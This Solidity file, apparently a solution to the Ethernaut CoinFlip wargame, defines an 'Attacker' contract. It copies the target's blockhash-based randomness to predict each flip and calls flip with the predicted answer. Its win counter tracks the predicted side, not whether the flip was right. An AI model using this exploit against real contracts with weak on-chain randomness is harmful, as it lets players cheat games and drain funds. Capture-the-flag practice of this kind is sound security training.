// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// We import this library to be able to use console.log
import "hardhat/console.sol";
import "../../node_modules/@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./CoinFlip.sol";

contract Attacker {

    uint8 public consecutiveWins = 0;
    using SafeMath for uint256;
    uint256 lastHash;
    CoinFlip public IcoinFlip; 
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    
    constructor(address _coinFlipAddr) public {
        IcoinFlip = CoinFlip(_coinFlipAddr);
    }


    function attack() external returns (uint8) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash == blockValue) {
            revert();
        }
        console.log(blockValue);
        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool isRight = IcoinFlip.flip(side);
        console.log(isRight);
        if(side == true)
        {
            consecutiveWins++;
        }

        return consecutiveWins;
    }

}